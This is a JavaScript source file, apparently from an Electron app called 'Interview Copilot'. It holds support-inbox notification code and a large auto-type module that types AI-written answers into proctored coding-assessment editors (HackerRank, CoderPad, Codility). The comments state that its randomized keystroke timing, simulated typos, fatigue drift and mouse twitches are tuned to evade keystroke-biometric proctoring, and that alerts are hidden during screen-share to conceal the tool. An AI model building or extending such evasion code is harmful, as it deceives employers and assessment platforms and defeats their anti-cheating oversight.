// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  SUPPORT INBOX ALERT BRIDGE
//  ─────────────────────────────────────────────────────────────
//  Receives renderer-side ipcRenderer.send('support:alert', {...})
//  whenever an agent's background WebSocket sees a new customer
//  join or message (see App.tsx). We surface that through three
//  channels in the desktop OS:
//
//   1. Native OS notification — Windows Action Center, macOS
//      Notification Center, Linux libnotify — survives renderer
//      hidden/minimized state because main owns the API.
//   2. Tray icon tooltip + menu — even when alerts are suppressed
//      for screen-share safety, the tray menu shows the unread
//      count so the admin can see "3 waiting" without breaking
//      the interview.
//   3. macOS Dock badge / Windows taskbar overlay icon — the
//      OS-native unread indicator pattern. App.setBadgeCount(n)
//      and BrowserWindow.setOverlayIcon are the cross-platform
//      moving parts.
//
//  Screen-share safety: if sessionActive=true we DO NOT fire the
//  desktop notification or the taskbar/dock badge (those render
//  outside setContentProtection and would leak both the app and
//  the customer's name into the screen-share). We still tick the
//  counter so when the session ends the admin sees the queue.
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

let supportUnreadCount = 0;
// Track the last alert per thread so back-to-back messages on the
// same thread coalesce into one Notification rather than three. Main
// side also debounces — renderer already deduplicates by 90s window,
// but this is belt-and-suspenders for ipc retry storms.
const supportLastAlertAt = new Map();
const SUPPORT_ALERT_DEBOUNCE_MS = 4 * 1000;

function updateSupportBadge() {
  const n = supportUnreadCount;
  // macOS dock badge — app.setBadgeCount(0) clears. Linux Unity also
  // honors this (no-op on other Linux desktops, which is fine).
  try { app.setBadgeCount(n); } catch (e) {
    electronLog.warn('[support-alert] setBadgeCount failed:', e && e.message);
  }
  // Windows taskbar overlay icon. We don't ship a number-glyph for
  // 'n', so we use a simple red dot. The tooltip carries the count.
  // Skipped during sessionActive — the overlay icon renders in the
  // OS taskbar which IS visible on a screen-share window picker.
  if (process.platform === 'win32' && mainWindow && !mainWindow.isDestroyed()) {
    try {
      if (n > 0 && !sessionActive) {
        const overlayPath = path.join(__dirname, '../build/icon-overlay.png');
        if (fs.existsSync(overlayPath)) {
          mainWindow.setOverlayIcon(nativeImage.createFromPath(overlayPath), `${n} waiting`);
        } else {
          // No asset — degrade to taskbar flash for attention.
          try { mainWindow.flashFrame(true); } catch {}
        }
      } else {
        mainWindow.setOverlayIcon(null, '');
        try { mainWindow.flashFrame(false); } catch {}
      }
    } catch (e) {
      electronLog.warn('[support-alert] setOverlayIcon failed:', e && e.message);
    }
  }
  // Refresh tray tooltip + menu so the count is visible there too.
  if (tray && !tray.isDestroyed()) {
    try {
      tray.setToolTip(n > 0 ? `Interview Copilot · ${n} support waiting` : 'Interview Copilot');
    } catch {}
  }
}

ipcMain.on('support:alert', (_event, payload) => {
  const threadId = String(payload?.threadId || '');
  const title = String(payload?.title || 'New chat').slice(0, 80);
  const body = String(payload?.body || '').slice(0, 240);
  const kind = String(payload?.kind || 'message');
  const customerEmail = String(payload?.customerEmail || '');

  if (!threadId) return;

  // Per-thread debounce. Renderer also debounces by 90s, but a flood
  // of messages from the same thread shouldn't fire 10 notifications.
  const last = supportLastAlertAt.get(threadId) || 0;
  if (Date.now() - last < SUPPORT_ALERT_DEBOUNCE_MS) {
    // Still bump the unread counter — we missed the toast but the
    // tray badge should reflect the activity.
    if (kind === 'customer_joined') supportUnreadCount += 1;
    updateSupportBadge();
    return;
  }
  supportLastAlertAt.set(threadId, Date.now());

  // Only customer_joined increments unread — message events for an
  // EXISTING thread are already represented in the count.
  if (kind === 'customer_joined') supportUnreadCount += 1;
  updateSupportBadge();

  // Screen-share guard: during a live interview, suppress visible
  // notifications. The counter still ticks (above) so the admin
  // sees the queue when the session ends.
  if (sessionActive) {
    electronLog.info(`[support-alert] suppressed during active session: ${title}`);
    return;
  }

  if (!Notification.isSupported()) {
    electronLog.info('[support-alert] Notification API unsupported on this OS');
    return;
  }

  try {
    const notif = new Notification({
      title,
      body,
      silent: false,
      tag: `support-${threadId}`,  // collapses same-thread re-fires on macOS/Linux
    });
    notif.on('click', () => {
      // Bring the main window forward and tell the renderer to open
      // the support inbox. Renderer handler in App.tsx flips the
      // bot panel + inbox tab open.
      if (mainWindow && !mainWindow.isDestroyed()) {
        try {
          if (!mainWindow.isVisible()) smoothShow(mainWindow);
          else mainWindow.focus();
        } catch {}
        try {
          mainWindow.webContents.send('support:open-inbox', { threadId, customerEmail });
        } catch {}
      } else {
        // Window was destroyed (rare). Recreate then signal.
        try {
          createMainWindow();
          // Give the renderer a beat to mount before sending the deeplink.
          setTimeout(() => {
            try { mainWindow?.webContents?.send('support:open-inbox', { threadId, customerEmail }); }
            catch {}
          }, 1500);
        } catch {}
      }
    });
    notif.show();
  } catch (err) {
    electronLog.warn('[support-alert] Notification show threw:', err && err.message);
  }
});

// Renderer signals "admin opened the inbox" — clear the unread state
// so the next genuine wait starts from zero.
ipcMain.on('support:clear-unread', () => {
  if (supportUnreadCount !== 0) {
    supportUnreadCount = 0;
    supportLastAlertAt.clear();
    updateSupportBadge();
  }
});

// Renderer signals "admin opened a SPECIFIC thread" — just clear the
// per-thread debounce so the next alert from that thread fires
// immediately rather than waiting out the 4s window.
ipcMain.on('support:thread-viewed', (_event, payload) => {
  const threadId = String(payload?.threadId || '');
  if (threadId) supportLastAlertAt.delete(threadId);
});

// ───────────────────────────────────────────────
//  AUTO-TYPE (nut-js) — type AI code blocks into an external editor
//  (HackerRank, CoderPad, CodeSignal, Codility, any Monaco/CodeMirror).
//
//  Flow: renderer invokes 'auto-type:send' with the code string.
//  Main runs a 3s countdown (broadcasting status so the button UI can
//  show a cancel affordance), hides our windows so OS focus falls to
//  the target editor underneath, then types char-by-char with a
//  human-like rhythm (Gaussian base speed, punctuation pauses, Shift
//  reach cost, double-letter speed-ups, occasional thinking pauses —
//  see autoTypeHumanDelay). After each Enter we wipe the editor's auto-inserted indent
//  (Home → Shift+End → Delete) so the AI's own leading whitespace lands
//  correctly instead of compounding with Monaco/CodeMirror's auto-indent.
//
//  nut-js native module is loaded LAZILY and memoized — a load failure
//  surfaces as a clean error rather than crashing app startup (same
//  lesson as the better-sqlite3 ABI incident).
// ───────────────────────────────────────────────

let _nut = null;
let _nutError = null;
function loadNut() {
  if (_nut) return _nut;
  if (_nutError) throw _nutError;
  try {
    _nut = require('@nut-tree-fork/nut-js');
    _nut.keyboard.config.autoDelayMs = 0;
    return _nut;
  } catch (e) {
    _nutError = e;
    throw e;
  }
}

// P8.5: interruptible sleep. The naive `setTimeout` version was blind to
// `autoTypeAbort` — if the user clicked cancel mid-P-burst (up to 4-10s)
// or during a tool-switch pause (up to 30s), the typing loop's next
// `if (autoTypeAbort) break;` check would not fire until the sleep
// completed. Now any sleep races against the abort signal: when the IPC
// `auto-type:abort` handler fires, all in-flight sleeps resolve immediately.
let _atAbortPromise = null;
let _atAbortResolve = null;

function autoTypeArmAbortSignal() {
  // Reset before each cycle so a prior cycle's resolved promise doesn't
  // make new sleeps return instantly.
  _atAbortPromise = new Promise(resolve => { _atAbortResolve = resolve; });
}

function autoTypeFireAbortSignal() {
  if (_atAbortResolve) {
    _atAbortResolve();
    _atAbortResolve = null;
  }
}

function autoTypeSleep(ms) {
  if (!_atAbortPromise || ms <= 5) {
    // No active cycle or trivially short — skip the race overhead.
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  return Promise.race([
    new Promise(resolve => setTimeout(resolve, ms)),
    _atAbortPromise,
  ]);
}

// Jittered short-nav sleep. Same intent as autoTypeSleep but the timing
// varies per call. Fixed-millisecond nav sequences (Home → Shift+End →
// Delete after every Enter, Ctrl+End cursor moves, Backspace sprees) are
// the loudest fingerprint in the run for keystroke-timing analyzers —
// real humans never press nav keys with perfectly identical inter-key
// gaps, so a deterministic 8/20/50ms cadence stands out cleanly against
// the otherwise human-shaped per-character distribution. Center the
// jittered range on the original constant so timing characteristics
// (focus settle, visual feedback) stay equivalent.
function autoTypeNavSleep(min, max) {
  return autoTypeSleep(min + Math.random() * (max - min));
}

// Human-paced delay between REPEATED deliberate navigation / selection
// keystrokes — the counted arrow-key runs in navigateToDocLine and the
// Shift+arrow range selection in selectLineRangeContent.
//
// autoTypeNavSleep's 8-20ms cadence is fine for the 2-3 micro-keystrokes
// of a per-line indent wipe, but a *run* of 10+ identical arrow events at
// that speed is the loudest possible keystroke-timing fingerprint — no
// human taps an arrow key a dozen times in ~150ms. Keystroke-biometric
// proctoring (Ropes-class, HackerRank's analyzer) locks onto exactly that
// kind of machine-regular burst. This centers each press on a realistic
// deliberate-tap cadence (~130ms, gaussian) and ~9% of the time inserts a
// longer pause — the user's eyes catching up to where the caret moved.
function autoTypeHumanNavSleep() {
  // Was autoTypeGauss(130, 42). Log-normal with σ=0.30 produces the right-
  // skewed shape real humans show on counted arrow runs (some keys fly past
  // fast, occasional longer pause when eyes catch up). Centered identically.
  let d = autoTypeLogNormal(130, 0.30);
  d = Math.max(58, Math.min(310, d));
  if (Math.random() < 0.09) d += 180 + Math.random() * 320;
  return autoTypeSleep(Math.round(d));
}

// Gaussian random via Box-Muller. Used as the primitive for autoTypeLogNormal
// (the actual distribution we want for keystroke timings).
function autoTypeGauss(mean, stdDev) {
  const u1 = Math.max(1e-9, Math.random());
  const u2 = Math.random();
  const z = Math.sqrt(-2 * Math.log(u1)) * Math.cos(2 * Math.PI * u2);
  return mean + z * stdDev;
}

// Log-normal random — sampled as exp(N(μ, σ)) where μ is chosen so that the
// expectation equals `meanMs`. This is the distribution real humans produce
// for keystroke timing (inter-keystroke interval AND dwell time). Gaussian
// IS WRONG for typing biometrics — the canonical Sciuto et al. paper (2021)
// rejects gaussian and finds 3-parameter log-logistic / log-normal best fit.
// Right-skewed with a fat tail; skewness ≈ 2, kurtosis ≈ 7 in real data.
//
// `sigmaLog` is the std of the underlying normal (in log-ms space). Larger σ
// = wider tail. Recommended: 0.25 (tight burst) to 0.45 (wide hesitation).
// Coefficient of variation (σ/μ in output space) ≈ sqrt(exp(σ²) - 1).
//   σ=0.25 → CV ≈ 0.25  (similar to current gaussian, just right-skewed)
//   σ=0.35 → CV ≈ 0.36
//   σ=0.45 → CV ≈ 0.47  (matches Dhakal 136M IKI distribution)
function autoTypeLogNormal(meanMs, sigmaLog) {
  // E[exp(N(μ, σ²))] = exp(μ + σ²/2). Solve for μ so the expectation = meanMs.
  const mu = Math.log(meanMs) - (sigmaLog * sigmaLog) / 2;
  return Math.exp(autoTypeGauss(mu, sigmaLog));
}

// Pareto random (power-law) — used for P-burst "cognitive" pauses humans take
// at clause / statement / function boundaries. Real human pause distributions
// have a Pareto tail above ~2s (the "P-burst boundary" in keystroke-logging
// literature) — heavy tails decaying by power law, not exponentially.
// A gaussian-tailed pause distribution underestimates how often a human pauses
// for 5+ seconds. Pareto(α=1.5, xm=1500) gives a realistic mix: median ~2.4s,
// mean ~4.5s, occasional 10+s pauses.
//
// `alpha` controls the tail (lower = fatter). `xm` is the minimum / scale.
function autoTypePareto(alpha, xm) {
  const u = Math.max(1e-9, Math.random());
  return xm / Math.pow(u, 1 / alpha);
}

// Cadence mode machine — a real typist drifts between bursts of fluent
// typing, steady flow, and spells of hesitation. Modes persist for 5–35
// chars before flipping, so pauses cluster naturally (start, middle, end —
// wherever the mode lands) instead of being uniformly sprinkled.
let _atMode = 'flow';
let _atModeCharsLeft = 0;

// AR(1) autocorrelation state — typing momentum. Real human IKI sequences
// have lag-1 autocorrelation of 0.3-0.6 (when you slow down you stay slow
// for a few keys; when in a burst you stay fast). i.i.d. random delays show
// ACF ≈ 0 — published as a top-3 detection feature in the hybrid-CAPTCHA
// keystroke-dynamics paper (arXiv 2510.02374, 2025). Mode persistence gives
// some correlation but it's discrete; a continuous AR(1) blend on top is
// what produces the smooth typing-momentum signal humans show.
let _atLastIki = null;
const AT_AR1_ALPHA = 0.45;  // blend weight on previous IKI

// P4: Session-level fatigue tracking. Real humans degrade over time —
// PLOS ONE typewriting-fatigue study: backspace rate rises 4.2% → 5.4%
// over a 2-hour session, IKI variance widens, error rate climbs ~30%.
// We track session-start time and apply a slow drift to per-char delays
// in autoTypeHumanDelay. Without this, every auto-type run starts "fresh"
// regardless of how long the user's been in the interview — a real human
// who's been on for 45 min types differently from one in their first 5.
let _atSessionStartMs = null;

function autoTypeResetCadence() {
  _atMode = 'flow';
  _atModeCharsLeft = 10 + Math.floor(Math.random() * 25);
  _atLastIki = null;  // fresh momentum per run
  _atAutocompleteAttempts = 0;  // per-run autocomplete counter
  // Session-start: set ONCE per app boot; subsequent auto-type invocations
  // inherit the accumulated session-time (real humans don't reset their
  // fatigue at each Auto-Type click). Reset only on explicit cadence reset
  // from a true fresh-app state.
  if (_atSessionStartMs === null) {
    _atSessionStartMs = Date.now();
  }
}

// Mouse-twitch state. A long stretch of pure-keyboard activity with zero
// pointer movement is the strongest signal that behavioral analyzers
// (Ropes-class proctoring, anything combining keyboard + mouse telemetry)
// lock onto — humans don't type 200 lines without ANY pointer drift, even
// from accidental hand-on-mouse contact. We schedule small pointer drifts
// every 18–31 lines (re-randomized after each fire so the cadence isn't
// itself a pattern) and never return the cursor to its starting point —
// real cursor drift accumulates, robot-style "move and return" doesn't.
let _atMouseLinesSinceTwitch = 0;
let _atMouseNextTwitchAt = 0;

function autoTypeResetMouseTwitch() {
  _atMouseLinesSinceTwitch = 0;
  _atMouseNextTwitchAt = 18 + Math.floor(Math.random() * 14);
}

async function autoTypeMaybeMouseTwitch(mouse) {
  _atMouseLinesSinceTwitch++;
  if (_atMouseLinesSinceTwitch < _atMouseNextTwitchAt) return;
  try {
    const pos = await mouse.getPosition();
    // Drift range chosen to be visible enough to register as activity in
    // a behavioral feed but small enough that it doesn't move the cursor
    // off a UI control the user might be hovering over (e.g. into a
    // tooltip-trigger).
    const dx = Math.round((Math.random() - 0.5) * 30);
    const dy = Math.round((Math.random() - 0.5) * 20);
    // Keep the cursor inside a safe interior region. The clamp values are
    // intentionally loose — nut-js will silently clip out-of-screen points
    // anyway, but biasing toward interior coords avoids edge-case behavior
    // where a clipped move registers as a click on the corner pixel on
    // some Windows builds.
    const targetX = Math.max(20, pos.x + dx);
    const targetY = Math.max(20, pos.y + dy);
    // nut-js's isPoint duck-checks for {x, y} numeric keys — a plain
    // object passes. Avoids the dance of importing Point from
    // @nut-tree-fork/shared (Point is not re-exported by nut-js's index).
    await mouse.move([{ x: targetX, y: targetY }]);
  } catch (e) {
    // Best-effort — mouse twitches are pure realism, never let a failure
    // bubble up and abort the typing run.
    console.warn('[auto-type] mouse twitch failed (non-fatal):', e && e.message);
  }
  _atMouseLinesSinceTwitch = 0;
  _atMouseNextTwitchAt = 18 + Math.floor(Math.random() * 14);
}

function autoTypeAdvanceMode() {
  if (_atModeCharsLeft > 0) { _atModeCharsLeft--; return; }
  const r = Math.random();
  // v3.4.7: shifted mode-flip probabilities toward 'flow' and 'hesitation'
  // so the rhythm spends less time in 'burst'. Combined with the higher
  // baselines below, this brings average effective WPM into the realistic
  // human-coder range (~30-45 WPM with frequent thinking pauses) instead
  // of the previous ~50-70 WPM bursts that read as bot-like to keystroke
  // biometrics on proctored platforms (Ropes, HackerRank, etc.).
  if (_atMode === 'flow') {
    // 22% burst (was 40%), 48% flow (was 40%), 30% hesitation (was 20%)
    _atMode = r < 0.22 ? 'burst' : r < 0.70 ? 'flow' : 'hesitation';
  } else if (_atMode === 'burst') {
    // Don't linger in burst — drop out fast. 55% flow (was 30%),
    // 25% burst (was 55%), 20% hesitation (was 15%).
    _atMode = r < 0.55 ? 'flow' : r < 0.80 ? 'burst' : 'hesitation';
  } else {
    // 55% flow (was 65%), 35% hesitation (was 25%), 10% burst (unchanged).
    // Slight bias to stay in hesitation a bit longer.
    _atMode = r < 0.55 ? 'flow' : r < 0.90 ? 'hesitation' : 'burst';
  }
  _atModeCharsLeft = 5 + Math.floor(Math.random() * 30);
}

// Per-character delay. Mode sets the base, then physical factors adjust:
//   • Shifted chars (caps, brackets, symbols) cost more (shift reach)
//   • Punctuation pauses longer (end-of-thought)
//   • Spaces add a small word-boundary pause
//   • Double letters fire faster (finger already on key)
//   • ~2.0% chance of an unscheduled 2-7s "stuck" pause — lands anywhere,
//     which is what makes pauses feel unpredictable.
//
// v3.4.7 tuning: baselines bumped ~50% across all three modes after user
// feedback that the previous rhythm was still too fast for proctored
// coding assessments (keystroke-biometric flagging). New baselines yield
// a realistic human-coder profile rather than a fast-typist profile:
//   burst:      ~120ms/char  → ~8 chars/sec  (was ~85ms / ~12 chars/sec)
//   flow:       ~210ms/char  → ~5 chars/sec  (was ~150ms / ~7 chars/sec)
//   hesitation: ~430ms/char  → ~2 chars/sec  (was ~300ms / ~3 chars/sec)
function autoTypeHumanDelay(ch, prevCh) {
  autoTypeAdvanceMode();

  let d;
  if (_atMode === 'burst') {
    // Was gauss(120, 25). σ_log=0.25 → CV ≈ 0.25, similar variance but
    // right-skewed (real humans produce log-normal, not gaussian). Clamp
    // bounds kept identical to preserve burst feel.
    d = autoTypeLogNormal(120, 0.25);
    d = Math.max(65, Math.min(220, d));
  } else if (_atMode === 'hesitation') {
    // Was gauss(430, 110). σ_log=0.40 — slightly wider tail because
    // hesitation pauses ARE the long-tail regime. Without P-burst overlay
    // (added separately below) this single mode wouldn't capture deep
    // thinking pauses; here we just give it an honest log-normal shape.
    d = autoTypeLogNormal(430, 0.40);
    d = Math.max(230, Math.min(720, d));
  } else {
    // Was gauss(210, 65). σ_log=0.35 → CV ≈ 0.36 within the clamp.
    // Canonical Dhakal 136M dataset has CV ≈ 0.47; the clamp constrains
    // us, but the distribution SHAPE is now correct (right-skewed, fat-
    // tailed) — which is what statistical detectors check, not just CV.
    d = autoTypeLogNormal(210, 0.35);
    d = Math.max(90, Math.min(460, d));
  }

  const isCap = ch >= 'A' && ch <= 'Z';
  const isBracket = '{}()<>[]'.indexOf(ch) !== -1;
  const isShiftSym = '!@#$%^&*_+=|~`"\''.indexOf(ch) !== -1;
  const isPunct = '.,;:'.indexOf(ch) !== -1;

  if (isCap) d += 30 + Math.random() * 60;
  if (isBracket) d += 80 + Math.random() * 140;
  if (isShiftSym) d += 50 + Math.random() * 100;
  if (isPunct) d += 100 + Math.random() * 200;
  if (ch === ' ') d += 15 + Math.random() * 70;

  // ── P2b: Bigram-conditional multiplier ──
  // Hand-alternation bigrams (e.g., "th", "ne", "or") are 50-80ms faster
  // than same-finger bigrams (e.g., "ed", "rt") in real human typing.
  // Without this, `qz` types identically to `th` — an ANOVA across bigram
  // classes would show p≈1, an obvious bot signal. See Ostry 1983 +
  // Aalto 136M study. Multiplier applies BEFORE the repeated-letter
  // speedup which has its own stronger effect.
  d *= autoTypeBigramMultiplier(prevCh, ch);

  if (prevCh && prevCh === ch && /[a-zA-Z]/.test(ch)) d *= 0.55;

  // ── P3b: AR(1) autocorrelation — typing momentum ──
  // Real human IKI sequences show lag-1 autocorrelation 0.3-0.6 — when you
  // slow down you stay slow for a few keys; when in a burst you stay fast.
  // i.i.d. random delays show ACF ≈ 0 — published as a top-3 detection
  // feature in arXiv 2510.02374. Mode persistence already gives some
  // correlation but it's discrete; this continuous blend on top produces
  // the smooth typing-momentum signal humans show.
  if (_atLastIki !== null) {
    d = AT_AR1_ALPHA * _atLastIki + (1 - AT_AR1_ALPHA) * d;
  }
  _atLastIki = d;

  // ── P4: Fatigue drift over session time ──
  // PLOS ONE typewriting-fatigue study: backspace rate rises 4.2% → 5.4%
  // over 2 hours, IKI variance widens, error rate climbs ~30%. We scale d
  // upward gently — +0.5% per minute, capped at +25% total. A 45-min
  // session adds ~22% to per-char delays. Without this, every run looks
  // identical regardless of how long the user's been at it.
  if (_atSessionStartMs !== null) {
    const sessionMins = (Date.now() - _atSessionStartMs) / 60000;
    const fatigueMult = 1 + Math.min(0.25, sessionMins * 0.005);
    d *= fatigueMult;
  }

  // ── P2c: P-burst structured pauses ──
  // Replaces the v3.4.7 uniform 2.0% stuck-pause. Real human pauses are
  // NOT uniformly distributed — they cluster at syntactic boundaries
  // (end of statement, end of block, after function signature) where the
  // typist is planning the next thing. The P-burst literature (>2s pause
  // = "P-burst boundary") describes exactly this. Pareto-tailed because
  // human pause distributions have power-law tails, not exponential.
  // The ~0.5% residual catches truly unscheduled pauses anywhere else.
  // P-burst pauses RESET typing momentum (cleared _atLastIki) so the
  // next keystroke after a 4s think doesn't anchor to the pre-pause IKI.
  const burstPause = autoTypeMaybeBurstPause(ch, prevCh);
  if (burstPause > 0) {
    d += burstPause;
    _atLastIki = null;
  }

  return Math.round(d);
}

// Hand-alternation classifier for QWERTY US layout. Returns one of
// 'alternation' (faster), 'same-finger' (slower), 'repetition' (already
// handled with stronger speedup elsewhere), or 'normal'.
const _AT_LEFT_HAND = 'qwertasdfgzxcvb';
const _AT_RIGHT_HAND = 'yuiophjklnm';
const _AT_FINGER_MAP = {
  q: 1, a: 1, z: 1,
  w: 2, s: 2, x: 2,
  e: 3, d: 3, c: 3,
  r: 4, f: 4, v: 4, t: 4, g: 4, b: 4,
  y: 5, h: 5, n: 5, u: 5, j: 5, m: 5,
  i: 6, k: 6,
  o: 7, l: 7,
  p: 8,
};
function autoTypeBigramClass(prevCh, ch) {
  if (!prevCh || !ch) return 'normal';
  if (!/[a-zA-Z]/.test(prevCh) || !/[a-zA-Z]/.test(ch)) return 'normal';
  const p = prevCh.toLowerCase();
  const c = ch.toLowerCase();
  if (p === c) return 'repetition';
  const pLeft = _AT_LEFT_HAND.includes(p);
  const cLeft = _AT_LEFT_HAND.includes(c);
  const pRight = _AT_RIGHT_HAND.includes(p);
  const cRight = _AT_RIGHT_HAND.includes(c);
  if (!(pLeft || pRight) || !(cLeft || cRight)) return 'normal';
  if (pLeft !== cLeft) return 'alternation';
  return _AT_FINGER_MAP[p] === _AT_FINGER_MAP[c] ? 'same-finger' : 'normal';
}
function autoTypeBigramMultiplier(prevCh, ch) {
  const cls = autoTypeBigramClass(prevCh, ch);
  if (cls === 'alternation') return 0.80;
  if (cls === 'same-finger') return 1.20;
  return 1.0;
}

// P-burst pause sampler — fires probabilistically AT syntactic boundaries
// based on the just-typed char (prevCh, since we're computing the delay
// BEFORE typing `ch`). All probabilities tuned so total time-spent-paused
// per 1000 chars is comparable to the previous uniform 2% × ~4500ms model
// (~80-90 seconds) but distributed at meaningful boundaries.
function autoTypeMaybeBurstPause(ch, prevCh) {
  if (!prevCh) return 0;
  // Capped Pareto sample. Original caps (8-12s) were realistic for human
  // "stuck thinking" pauses, but users perceived 10s+ pauses as the app
  // freezing/hanging. Capped at 5s for confidence-building UX — still
  // produces the heavy-tailed, syntax-clustered pause distribution that
  // matters for biometric detection, just bounded.
  const sample = (alpha, xm, cap) => Math.min(autoTypePareto(alpha, xm), cap);
  // End of statement (`;`)
  if (prevCh === ';' && Math.random() < 0.08) return sample(1.5, 1200, 5000);
  // End of block (`}`)
  if (prevCh === '}' && Math.random() < 0.08) return sample(1.5, 1200, 5000);
  // Colon (Python def/if, function-signature end, JS object)
  if (prevCh === ':' && Math.random() < 0.12) return sample(1.5, 1000, 4500);
  // Opening brace
  if (prevCh === '{' && Math.random() < 0.06) return sample(1.7, 800, 4000);
  // Comma in argument list / literal
  if (prevCh === ',' && Math.random() < 0.03) return sample(2.0, 500, 3500);
  // Residual unscheduled
  if (Math.random() < 0.005) return sample(2.0, 1200, 5000);
  return 0;
}

// QWERTY neighbors for plausible typos. Letters only — typing a typo on
// brackets/quotes/operators can interact with editor auto-close logic and
// leave state off, so we whitelist letters.
const AT_ADJ = {
  a:'sq', b:'vn', c:'xv', d:'sf', e:'wr', f:'dg', g:'fh', h:'gj',
  i:'uo', j:'hk', k:'jl', l:'k',  m:'n',  n:'bm', o:'ip', p:'o',
  q:'wa', r:'et', s:'ad', t:'ry', u:'yi', v:'cb', w:'qe', x:'zc',
  y:'tu', z:'x'
};

function autoTypePickTypoChar(correct) {
  const lower = correct.toLowerCase();
  const neighbors = AT_ADJ[lower];
  if (!neighbors) return null;
  const pick = neighbors[Math.floor(Math.random() * neighbors.length)];
  return correct === correct.toUpperCase() ? pick.toUpperCase() : pick;
}

// ── P1a: Per-keystroke dwell time ──
// THE SINGLE LARGEST FINGERPRINT FIX. Real human key dwell (press-to-release
// duration) is 60-150ms (Aalto 136M-keystroke study). Bots that use
// keyboard.type(ch) — which press-then-immediately-release with sub-ms gap —
// have effectively 0ms dwell. Every published biometric classifier uses
// dwell as feature #1 (CMU "tie5Roanl" benchmark, FCaptcha v1.3, BeCAPTCHA-Type).
//
// To inject real dwell, we replace `keyboard.type(ch)` (which is press+release
// internally with no gap) with manual `pressKey(K)` → sleep(dwell) → `releaseKey(K)`.
// Requires a char→Key mapping. For US QWERTY chars we cover the common set
// below; unmapped chars (unicode, accented, etc.) fall back to keyboard.type
// — which loses dwell but preserves correctness.
//
// Dwell sampled per-character based on key biomechanics: common keys (e, t, a,
// space) are shorter; pinky/uncommon keys (q, z, j, special chars) longer.
// Clamped [30, 180] ms to stay below OS key-repeat thresholds (typically
// 250-500ms — held longer would trigger spurious key-repeat events).

// US QWERTY char → {Key enum name, needs-shift}. Covers a-z, A-Z, 0-9,
// space, common punctuation, and shifted versions thereof.
const _AT_CHAR_KEY_MAP = (() => {
  const m = {};
  // a-z / A-Z (same Key.A enum, shift toggles case)
  for (let i = 0; i < 26; i++) {
    const lower = String.fromCharCode(97 + i);   // 'a'
    const upper = String.fromCharCode(65 + i);   // 'A'
    const name = upper;                          // nut-js Key.A ... Key.Z
    m[lower] = { name, shift: false };
    m[upper] = { name, shift: true };
  }
  // 0-9 and shifted symbols
  const digitShift = { '0': ')', '1': '!', '2': '@', '3': '#', '4': '$',
                       '5': '%', '6': '^', '7': '&', '8': '*', '9': '(' };
  for (let d = 0; d <= 9; d++) {
    const digit = String(d);
    const name = `Num${d}`;
    m[digit] = { name, shift: false };
    m[digitShift[digit]] = { name, shift: true };
  }
  // Punctuation / symbols (US layout, dedicated keys)
  m[' ']  = { name: 'Space',        shift: false };
  m['\t'] = { name: 'Tab',          shift: false };
  m['.']  = { name: 'Period',       shift: false };  m['>'] = { name: 'Period',       shift: true };
  m[',']  = { name: 'Comma',        shift: false };  m['<'] = { name: 'Comma',        shift: true };
  m[';']  = { name: 'Semicolon',    shift: false };  m[':'] = { name: 'Semicolon',    shift: true };
  m["'"]  = { name: 'Quote',        shift: false };  m['"'] = { name: 'Quote',        shift: true };
  m['[']  = { name: 'LeftBracket',  shift: false };  m['{'] = { name: 'LeftBracket',  shift: true };
  m[']']  = { name: 'RightBracket', shift: false };  m['}'] = { name: 'RightBracket', shift: true };
  m['\\'] = { name: 'Backslash',    shift: false };  m['|'] = { name: 'Backslash',    shift: true };
  m['/']  = { name: 'Slash',        shift: false };  m['?'] = { name: 'Slash',        shift: true };
  m['`']  = { name: 'Grave',        shift: false };  m['~'] = { name: 'Grave',        shift: true };
  m['-']  = { name: 'Minus',        shift: false };  m['_'] = { name: 'Minus',        shift: true };
  m['=']  = { name: 'Equal',        shift: false };  m['+'] = { name: 'Equal',        shift: true };
  return m;
})();

// Sample a dwell time (ms) for a given character. Common keys are shorter,
// pinky / uncommon longer. Log-normal-distributed (right-skewed, like real
// human dwell). Clamped [30, 180] to avoid OS key-repeat trigger.
function autoTypeSampleDwell(ch) {
  let baseMean;
  const lower = (ch || '').toLowerCase();
  if (' eta'.includes(lower))                  baseMean = 65;   // most common
  else if ('inosrh'.includes(lower))           baseMean = 75;   // next-tier common
  else if ('lcdumpgwfybkv'.includes(lower))    baseMean = 90;   // mid
  else if ('jxqz'.includes(lower))             baseMean = 115;  // pinky / rare
  else                                          baseMean = 95;   // symbols / digits
  const d = autoTypeLogNormal(baseMean, 0.30);
  return Math.max(30, Math.min(180, Math.round(d)));
}

// ── Hold a key, and ALWAYS let go of it ──
// pressKey and releaseKey are two separate OS events with our own code in
// between, so anything that throws in the middle leaves the key PHYSICALLY
// DOWN — the OS has no idea we gave up. And these calls do throw in the
// field: see the note further down about libnut's "Invalid key flag" on
// some Windows builds, and a focus change mid-chord does it too. With
// Shift or Ctrl stuck down, the rest of the answer types as chords (Ctrl+A,
// Ctrl+S, Ctrl+W) or as capitals, and — the part that really hurts — the
// modifier stays down after the run ends, so the USER's own keystrokes are
// chords too, mid-interview, in someone else's editor.
//
// So every hold in this file goes through here and the release lives in a
// finally. The press is inside the try as well: if pressKey itself half-
// fails we'd rather emit a redundant keyup (a no-op at OS level for a key
// that isn't down) than gamble on it. The release is swallowed so a failing
// release can never mask the original error — the caller still sees the
// real throw, and every existing catch-and-continue behaves as before.
//
// Timing is the caller's business: whatever fn awaits IS the dwell, so the
// deliberate distinction between 0ms and a sampled dwell survives intact.
async function withHeldKey(keyboard, key, fn) {
  try {
    await keyboard.pressKey(key);
    return await fn();
  } finally {
    try { await keyboard.releaseKey(key); } catch (_) {}
  }
}

// ── The belt to withHeldKey's braces ──
// The per-hold finally covers the normal unwind. A hard fault — an uncaught
// exception tearing through the middle of a chord — can still get past it,
// and that state OUTLIVES the run. So we sweep every modifier at the end of
// every Auto-Type run and from the uncaughtException net.
//
// Only ever uses the already-memoized nut handle. It must NEVER call
// loadNut(): both callers are last-resort paths, and pulling a native .node
// in from an exception handler is exactly how a bad moment becomes a worse
// one. If Auto-Type never ran, nothing is held and there is nothing to do.
//
// Every release is individually swallowed, and unknown key names are skipped
// — nut-js builds differ on which Right*/Super keys exist, and one missing
// enum entry must not stop the sweep from reaching the rest. Being async,
// nothing in here can throw synchronously at a caller either; the worst case
// is a rejected promise, and both call sites .catch() it.
//
// The name list is local on purpose: a module-scope const would sit in its
// temporal dead zone if an uncaughtException fired while this file was still
// evaluating, and this is the one path that has to survive that.
